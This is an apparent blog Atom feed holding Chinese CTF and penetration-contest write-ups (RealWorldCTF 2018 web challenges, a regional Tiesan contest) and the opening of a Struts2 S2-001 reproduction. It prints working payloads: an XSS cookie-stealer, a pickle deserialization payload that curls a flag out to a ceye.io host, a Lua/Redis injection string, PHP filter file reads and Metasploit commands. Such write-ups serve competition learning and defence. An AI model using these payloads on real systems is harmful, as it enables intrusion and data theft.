<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>打代码的怪兽 CodeMonster</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.codemonster.cn/"/>
  <updated>2018-07-31T05:19:20.724Z</updated>
  <id>https://www.codemonster.cn/</id>
  
  <author>
    <name>CodeMonster</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2018 RWCTF web WriteUp</title>
    <link href="https://www.codemonster.cn/2018/07/31/2018-rwctf-web-writeup/"/>
    <id>https://www.codemonster.cn/2018/07/31/2018-rwctf-web-writeup/</id>
    <published>2018-07-31T05:11:58.000Z</published>
    <updated>2018-07-31T05:19:20.724Z</updated>
    
    <content type="html"><![CDATA[<p>周末打了长亭举办的RealWorldCTF，tql，写一下web的wp给博客除除草。  </p>
<a id="more"></a>
<h1 id="dot-free"><a href="#dot-free" class="headerlink" title="dot free"></a>dot free</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">All the IP addresses and domain names have dots, but can you hack without dot?</div></pre></td></tr></table></figure>
<p>主页有个提交url的框，尝试提交自己的url，但是打不到，怀疑限制了ip，测试中发现网站是是django，并且开启了debug模式，提交错误的post参数就可以看到报错信息<br><img src="/img/2018-rwctf-img8.png" alt=""></p>
<p>可以看到web站点的名字叫 XSSWebSite，于是找xss的点，尝试查找django的xss，但是最新版本并没有已知的xss漏洞，后面发现主页存在这样一段js代码，看起来是个domxss<br><img src="/img/2018-rwctf-img9.png" alt=""></p>
<p>调试一下，可以知道这段代码从浏览器的url取了查询字符串，urldecode后格式化为json，然后发送到一个监听器里去操作，代码里过滤了value参数不能出现<code>.</code>，<code>//</code>和<code>。</code>，type不为iframe的时候会将value插入到一个script标签中<br>看到这里和题目提示对应上了，不能出现<code>.</code>，最后构造payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://13.57.104.34/?&#123;%22iframe%22:&#123;%22value%22:%22http:/\\111111111%22,%22type%22:%22xxxx%22&#125;&#125;</div></pre></td></tr></table></figure></p>
<p>11111111替换为自己的vps的ip转10进制，可以看到页面里已经出现一个src=11111111的script标签了<br><img src="/img/2018-rwctf-img11.png" alt=""></p>
<p>然后提交这个url到Recieve，服务端就会执行vps上提前构造好的js语句了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.location.href=<span class="string">"http://xxxxxxx/?="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</div></pre></td></tr></table></figure></p>
<p>最后flag在cookie里<br><img src="/img/2018-rwctf-img10.png" alt=""><br>flag:  rwctf{L00kI5TheFlo9}</p>
<h1 id="bookhub"><a href="#bookhub" class="headerlink" title="bookhub"></a>bookhub</h1><p>题目提示www.zip，可以下载到源码<br>看到代码里登陆的时候会检查ip白名单，这里的ip是取的xff，不在白名单内会提示ip不在白名单内<br><img src="/img/2018-rwctf-img12.png" alt=""><br>修改xff为白名单ip失败，猜测xff获取到的是nginx转发过去的ip，所以想到从上面这串里的唯一一个外网ip 18.213.16.123入手<br>扫描该ip，发现5000端口也开了一个相同的应用程序bookhub，并且开启了debug模式，在这里登陆的提示是密码错误，说明已经绕过了白名单检查。</p>
<p>审计代码发现有一处鉴权的装饰器使用错误(route和login_required顺序反了)<br><img src="/img/2018-rwctf-img4.png" alt=""><br>这会导致鉴权装饰器无效，没有登陆的用户也能调用该接口（debug模式下<br>查看接口代码，可以知道这个接口eval了lua脚本，用来清除除了自己之外其他所有人的session，其中sessionid存在拼接操作，并且可控，想到可以注入点东西<br><img src="/img/2018-rwctf-img5.png" alt=""><br>参考 <a href="https://www.ctolib.com/topics-129777.html" target="_blank" rel="noopener">https://www.ctolib.com/topics-129777.html</a><br>通过这个接口，将恶意的数据（cPickle反序列化漏洞的payload）注入到redis中，当鉴权的时候就会反序列化该字符串，就能任意命令执行了，但是因为该接口需要csrf_token校验，所以多一步获取token的操作<br>具体操作如下：<br>1.生成payload：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> cPickle</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        s = <span class="string">"""curl http://xxxx.ceye.io/`/readflag|base64`"""</span></div><div class="line">        <span class="keyword">return</span> os.system, (s,)</div><div class="line"></div><div class="line">evil = cPickle.dumps(genpoc())</div><div class="line"><span class="keyword">print</span> evil.replace(<span class="string">"\n"</span>,<span class="string">"\\n"</span>)</div></pre></td></tr></table></figure></p>
<p>2.构造恶意的sessionid并访问/login/获取csrf_token：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bookhub-session=aaa<span class="string">"&#125; redis.call("</span>set<span class="string">","</span>bookhub:session:aaa<span class="string">","</span>cposix\nsystem\np1\n(S<span class="string">'curl http://xxxxxxx.ceye.io/`/readflag|base64`'</span>\np2\ntRp3\n.<span class="string">")--;</span></div></pre></td></tr></table></figure></p>
<p>这里拼接进lua脚本后长这样：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">local</span> inputs = &#123;<span class="string">"bookhub:session:aaa"</span>&#125;</div><div class="line">redis.call(<span class="string">"set"</span>,<span class="string">"bookhub:session:aaa"</span>,<span class="string">"cposix\nsystem\np1\n(S'curl http://xxxxxxx.ceye.io/`/readflag|base64`'\np2\ntRp3\n."</span>)<span class="comment">--;</span></div></pre></td></tr></table></figure></p>
<p>到时候脚本运行后就会将恶意数据写入<code>aaa</code>这个session-id的value里，并且删除其他除了aaa意外的session<br><img src="/img/2018-rwctf-img6.png" alt=""><br>3.带着2中生成的ssrf_token和恶意的session-id去请求 /admin/system/refresh_session<br>postdata： submit=1&amp;ssrf_token=<br>导致lua代码注入修改我们的目标session-id的value值, 最后用<code>aaa</code>这个session-id任意访问一个需要session的页面即可触发反序列化漏洞执行命令<br>最后用ceye外带出flag<br><img src="/img/2018-rwctf-img13.png" alt=""></p>
<h1 id="Print-MD"><a href="#Print-MD" class="headerlink" title="Print-MD"></a>Print-MD</h1><p>Print-MD这道题比赛过程中没做出来，比赛结束忙着上班，wp还没写完，先写一下思路<br>想看wp的可以去蓝猫师傅的博客膜一下 <a href="https://blog.cal1.cn/post/RealWorldCTF%20PrintMD%20writeup" target="_blank" rel="noopener">RealWorldCTF PrintMD writeup</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">PrintMD</div><div class="line">Paste your HackMD link to get a printer-friendly version!</div><div class="line">The note should neither be Protected nor Private.</div><div class="line">Press Ctrl + P to print or save as PDF.</div><div class="line">PrintMD is compatible with outdated browsers.</div><div class="line">If the link is published version of the note, which contains /s/, you can append /edit to get the original link. e.g., https://hackmd.io/s/HyCFXNkNm/edit</div><div class="line">‍flag is in /flag</div></pre></td></tr></table></figure></p>
<p><code>print?url=</code>可以提交一个hackmd的链接并将md文档解析为html，但是限制了只能读取<code>https://hackmd.io/</code>开头的url，故无法ssrf  </p>
<p>第一个hint提示 兼容低版本浏览器，其实之前就有发现在我本机<code>不同浏览器</code>访问print接口会有不同的效果：</p>
<ol>
<li>chrome请求该接口，返回的标题是 <code>请稍后</code>，然后浏览器再往外发请求获取hackmd的md内容，然后解析成html展示到页面上  </li>
<li>firefox请求接口，返回的是已经解析好的html标签，很明显后端做了请求并解析md为html的工作</li>
</ol>
<p>猜测print接口应该是校验了user-agent，于是测试了一下chrome的ua，发现66.0是个分水岭，然而并没有啥进展<br><img src="/img/2018-rwctf-img1.png" alt=""><br><img src="/img/2018-rwctf-img2.png" alt=""></p>
<p>后面查看前端代码里的 print.ba84889093b992d33112.js<br>发现这样一段代码<br><img src="/img/2018-rwctf-img3.png" alt=""><br>可以看到这个应该就是print接口的核心代码了，接受到url参数，判断是否为hackmd的url，然后在url最后如果不是/download就拼接一个/download进去，<br>因为hackmd.io/xxxxxxx/download 是可以下载markdown格式的文件的，<br>然后将ua和url传入 <code>/api/render/</code> 接口，因为这个接口外部没有权限访问（访问会403），而且不知道这个接口调用了啥库，所以陷入了僵局</p>
<p>hint2 给了render.js的代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> &#123;Router&#125; = <span class="built_in">require</span>(<span class="string">'express'</span>)</div><div class="line"><span class="keyword">const</span> &#123;matchesUA&#125; = <span class="built_in">require</span>(<span class="string">'browserslist-useragent'</span>)</div><div class="line"><span class="keyword">const</span> router = Router()</div><div class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</div><div class="line"><span class="keyword">const</span> md = <span class="built_in">require</span>(<span class="string">'../../plugins/md_srv'</span>)</div><div class="line"></div><div class="line">router.post(<span class="string">'/render'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">  <span class="keyword">let</span> ret = &#123;&#125;</div><div class="line">  ret.ssr = !matchesUA(req.body.ua, &#123;</div><div class="line">    browsers: [<span class="string">"last 1 version"</span>, <span class="string">"&gt; 1%"</span>, <span class="string">"IE 10"</span>],</div><div class="line">    _allowHigherVersions: <span class="literal">true</span></div><div class="line">  &#125;);</div><div class="line">  <span class="keyword">if</span> (ret.ssr) &#123;</div><div class="line">    axios(req.body.url).then(<span class="function"><span class="params">r</span> =&gt;</span> &#123;</div><div class="line">          ret.mdbody = md.render(r.data)</div><div class="line">      res.json(ret)</div><div class="line">    &#125;)</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    ret.mdbody = md.render(<span class="string">'# 请稍候…'</span>)</div><div class="line">    res.json(ret)</div><div class="line">  &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = router</div></pre></td></tr></table></figure></p>
<p>可以看到我们可控的地方有三个点，分别对应三个库：</p>
<ol>
<li>ua: 对应<code>browserslist-useragent</code>库，主要是用来判断当前ua版本是否符合预期版本，感觉问题不大</li>
<li>url: 对应<code>axios</code>库，当ua版本被判定为低版本时，会用axios对url发送一个get请求，但是url限制死了只能 <code>https://hackmd.io/</code>，所以能利用的地方有限</li>
<li>r.data: url返回的内容，然后用<code>../../plugins/md_srv</code>这个库进行了解析，不知道这个库是啥情况</li>
</ol>
<p>比赛过程中到这里又陷入了僵局，赛后问了蓝猫师傅才知道利用点在axios这边</p>
<p>未完待续。。。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;周末打了长亭举办的RealWorldCTF，tql，写一下web的wp给博客除除草。  &lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="WEB" scheme="https://www.codemonster.cn/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>2018 信息安全铁人三项赛第七(福建)赛区 WriteUp</title>
    <link href="https://www.codemonster.cn/2018/05/17/2018-t3sec-fujian-writeup/"/>
    <id>https://www.codemonster.cn/2018/05/17/2018-t3sec-fujian-writeup/</id>
    <published>2018-05-17T06:42:59.000Z</published>
    <updated>2018-07-28T06:19:57.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>时隔一年再次参加铁三，今年的赛制有点改动，企业赛个人赛和数据赛三场在同一天进行，在队友们的带领下混了个赛区第二名，成功晋级决赛。本次比赛中我主要负责的是企业赛部分，也就是对给定目标进行渗透测试，然后中间穿插着做了几道数据赛的题，这里记录一下。（因为比赛过程中没怎么截图，师傅们别打我）</p>
<a id="more"></a>
<h2 id="0x00-企业赛，启动"><a href="#0x00-企业赛，启动" class="headerlink" title="0x00 企业赛，启动"></a>0x00 企业赛，启动</h2><p>比赛开始，从平台里可以看到给了两个ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">202.1.2.50</div><div class="line">202.1.2.60</div></pre></td></tr></table></figure></p>
<p>先从50这台下手，nmap扫描得到几个端口：80,137,3389等<br>这里基本可以知道是台windows服务器了（可能有ms系列漏洞或者可以3389爆破一波），<br>打开浏览器直接访问发现是个php页面，存在文件包含漏洞，源代码提示包含Tips.php，直接用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">?file=php://filter/read=convert.base64-encode/resource=Tips.php</div><div class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
<p>读一下源码，得到提示：<code>Have you ever heard of SNMP information trasures??</code><br>先不管提示，fuzz读取了一下<code>flag.php</code>，直接读取到flag5，拿下100分，这里开了个脑洞，c盘根目录会不会也有个flag呢？<br>于是尝试读取<code>c:\\flag.txt</code>，果然，读到了flag4，又拿下100分。（这里工作人员过来问我是不是拿到了服务器权限，怎么这么快，只能告诉他我是靠意识猜的flag）  </p>
<h2 id="0x01-拿下服务器"><a href="#0x01-拿下服务器" class="headerlink" title="0x01 拿下服务器"></a>0x01 拿下服务器</h2><p>再回到提示，通过搜索引擎，找到了这篇文章：<a href="http://www.freebuf.com/column/144144.html" target="_blank" rel="noopener">一次对SNMP服务的渗透测试</a><br>文中给出了多种方法对SNMP服务进行渗透测试，这里我采用了<code>metasploit</code>的<code>auxiliary/scanner/snmp/snmp_login</code>，设置一下参数然后运行，跑出SNMP存在弱密码，可以直接读取系统的敏感信息，使用如下命令查看一波<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">snmpwalk -v1 -c admin <span class="number">202</span>.<span class="number">1</span>.<span class="number">2</span>.<span class="number">50</span></div></pre></td></tr></table></figure></p>
<p>然后返回了一大堆系统敏感，有用户列表，ip信息等等，在用户列表那里发现了一个名为<code>libai</code>的用户，随手<code>mstsc</code>连接3389测试一下弱口令，果不其然，<code>libai</code>用户的密码为<code>admin</code>，查看一下还有管理员权限，这里就算是彻底拿下50这台服务器了<br>在服务器里探索一波，发现http服务是用<code>phpstudy</code>搭建的，用phpstudy连接进mysql数据库，在test数据库里找到flag6<br>然后全局搜索文件，搜索到两个名字带有flag的图片文件，让队友去做了，不过也没做出啥  </p>
<h2 id="0x02-内网渗透"><a href="#0x02-内网渗透" class="headerlink" title="0x02 内网渗透"></a>0x02 内网渗透</h2><p>服务器翻得差不多了，内网探测一波，发现如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">192.168.1.2 开启80，53端口</div><div class="line">192.168.1.43 8080端口存在一个dotcms</div></pre></td></tr></table></figure></p>
<p>.2这台感觉是台dns服务器，不过没有什么思路，先从dot开始吧，这里因为dot在50的内网，拷工具进去渗透很不方便，在50上用ew跑了个socks5代理，把50当作跳板<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ew_for_Win.exe -s ssocksd -l <span class="number">1080</span></div></pre></td></tr></table></figure></p>
<p>然后本地配个代理就能直接访问了，搜索引擎查到该版本的dotcms存在一个sql注入和一个后台getshell漏洞，但是注入还是盲注，好麻烦<br>后台测了一波弱口令，未果，突然发现在普通用户登录界面有个邮箱和密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bill@xxxxx.com (具体的我忘了！)</div><div class="line">bill</div></pre></td></tr></table></figure></p>
<p>猜测它也是后台管理员帐号，直接登陆，果然成功了，然后用后台getshell漏洞来getshell<br>参考地址:<a href="http://seclists.org/fulldisclosure/2017/Jul/33" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/2017/Jul/33</a><br>参考文章，找到上传点，这里我用firefox的修改数据包功能构造了<code>任意文件上传</code>的包，传了个jsp网马，这里因为后台有waf的原因，还是上了个免杀马才成功的，总之拿到了shell<br><img src="/img/2018-t3sec-1.png" alt=""><br>因为是<code>jsp网站</code>的原因，直接就是<code>administrator</code>权限了，在c盘发现了flag2，当时时间有限而且这台服务器没有开启3389，没有继续深入挖掘，后来听说dot的前端页面也有个flag，然后还有个flag在回收站里，脑洞果然够大，附上cmd查看回收站命令：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> $recycle.bin</div></pre></td></tr></table></figure></p>
<h2 id="0x03-FTP服务器"><a href="#0x03-FTP服务器" class="headerlink" title="0x03 FTP服务器"></a>0x03 FTP服务器</h2><p>接着对60服务器进行渗透测试，nmap扫描，发现开启了21，22，445，有个ftp服务，当时查了一下ftp版本，没啥漏洞，然后用<code>hydra</code>爆破一波，也没爆出来东西，赛后得知是linux的永恒之蓝漏洞，这里记录一下，参考：<a href="https://bbs.ichunqiu.com/thread-23281-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-23281-1-1.html</a><br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">use exploit/linux/samba/is_known_pipename</div><div class="line"><span class="built_in">set</span> RHOST <span class="number">202</span>.<span class="number">1</span>.<span class="number">2</span>.<span class="number">60</span></div><div class="line">run</div></pre></td></tr></table></figure></p>
<h2 id="0x04-数据赛"><a href="#0x04-数据赛" class="headerlink" title="0x04 数据赛"></a>0x04 数据赛</h2><p>先贴一下最终答案截图（队友余老师截的图）<br><img src="/img/2018-t3sec-2.png" alt=""><br><img src="/img/2018-t3sec-3.png" alt=""><br>其中大部分题目只要对渗透测试有一定的了解，会使用wireshark之类的流量分析工具，都能解出，我就不详细说了，<br>讲一下卡了特别久的两道题（中间差点跳过那种，还好没跳过，最后全部做出加了100多分），一个是第9题，图片木马的密码是什么，这里其实只要找到对应的位置，将图片文件下载下来，然后cat一下就能发现php一句话了（我也不知道为什么卡了那么久）<br>还有一个是第12题，找黑客往FTP上传的文件名，因为挂了个reGeorg代理，ftp协议变得很奇怪，这里我也找了好久，以为后面还有很多题，想当然地以为这题一定在第8个数据包里，结果只找到了FTP密码，然后想了想去看看第9个包吧，进去搜索一下FTP协议上传文件的命令<code>STOR</code>，直接就找到了</p>
<h2 id="0x05-个人赛"><a href="#0x05-个人赛" class="headerlink" title="0x05 个人赛"></a>0x05 个人赛</h2><p>队友jaken拿了个一血，web狗表示膜拜</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今年分区赛因为和Defcon China撞车的原因，几个强队好像都不是主力来打，没有被吊打的很严重，不过还是看到了自己的很多不足，内网渗透做做的还不是特别好，对很多漏洞没有敏感的嗅觉，对几个工具的使用也不是特别熟练，数据分析卡题严重<br>不过结果还是好的，拿了个亚军，成功晋级决赛，不知道有没有机会打～，附上最后排行图<br><img src="/img/2018-t3sec-4.png" alt=""><br>（最后弱弱地吐槽一下，今年亚军的奖金比去年1/3场分区赛的季军奖金还少！）</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;时隔一年再次参加铁三，今年的赛制有点改动，企业赛个人赛和数据赛三场在同一天进行，在队友们的带领下混了个赛区第二名，成功晋级决赛。本次比赛中我主要负责的是企业赛部分，也就是对给定目标进行渗透测试，然后中间穿插着做了几道数据赛的题，这里记录一下。（因为比赛过程中没怎么截图，师傅们别打我）&lt;/p&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="流量分析" scheme="https://www.codemonster.cn/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="渗透" scheme="https://www.codemonster.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Struts2Vuls之S2-001漏洞复现与简要分析</title>
    <link href="https://www.codemonster.cn/2018/03/28/2018-struts2-001/"/>
    <id>https://www.codemonster.cn/2018/03/28/2018-struts2-001/</id>
    <published>2018-03-28T14:34:58.000Z</published>
    <updated>2018-07-28T06:19:53.020Z</updated>
    
    <content type="html"><![CDATA[<p>最近经历了几次面试，深觉在企业中，java安全是十分受重视的，于是打算对java安全进行深入学习，本系列是对Struts2的漏洞进行分析与复现，写的不好欢迎大家指出问题，本文所有源码与poc&amp;exp：<a href="https://github.com/xishir/Struts2Vuls/tree/master/S2-001" target="_blank" rel="noopener">https://github.com/xishir/Struts2Vuls/tree/master/S2-001</a><br><a id="more"></a></p>
<h1 id="漏洞摘要"><a href="#漏洞摘要" class="headerlink" title="漏洞摘要"></a>漏洞摘要</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">官方链接：https://cwiki.apache.org/confluence/display/WW/S2-001</div><div class="line">官方概述：Remote code exploit on form validation error</div><div class="line">影响版本：Struts 2.0.0 - Struts 2.0.8</div><div class="line">修复摘要：数据 re-display 时禁止执行 OGNL 表达式</div></pre></td></tr></table></figure>
<h1 id="简要原理"><a href="#简要原理" class="headerlink" title="简要原理"></a>简要原理</h1><p>在默认配置下，如果用户所提交的表单出现<code>验证错误</code>，后端会对用户的输入进行<code>解析处理</code>，然后返回并<code>显示处理结果</code>。  举个例子，当你提交的登录表单为<code>username=xishir&amp;password=%{1+1}</code>时，后端验证登录失败后会返回登录界面并显示你的输入，这时password字段中的OGNL表达式已经被解析处理过了，所以会显示<code>%{1+1}</code>的解析结果<code>2</code>，从而可以构造payload进行RCE。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h3 id="下载struts-2-0-1"><a href="#下载struts-2-0-1" class="headerlink" title="下载struts-2.0.1"></a>下载struts-2.0.1</h3><p>地址：<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip</a></p>
<h3 id="创建web工程"><a href="#创建web工程" class="headerlink" title="创建web工程"></a>创建web工程</h3><p>目录结构<br><img src="/img/s2/s2-001-1.png" alt=""><br>这里我是用的是MyEclipse，创建一个web工程，然后将struts-2.0.1中的几个jar包导入并新建如下几个文件<br>web.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"3.1"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>S2-001 Example<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>index.jsp<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span></span></div><div class="line"><span class="tag">    <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></div><div class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-001<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>S2-001 Demo<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>link: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;</span>https://cwiki.apache.org/confluence/display/WW/S2-001<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">s:form</span> <span class="attr">action</span>=<span class="string">"login"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">label</span>=<span class="string">"username"</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">label</span>=<span class="string">"password"</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">s:submit</span>&gt;</span><span class="tag">&lt;/<span class="name">s:submit</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">s:form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
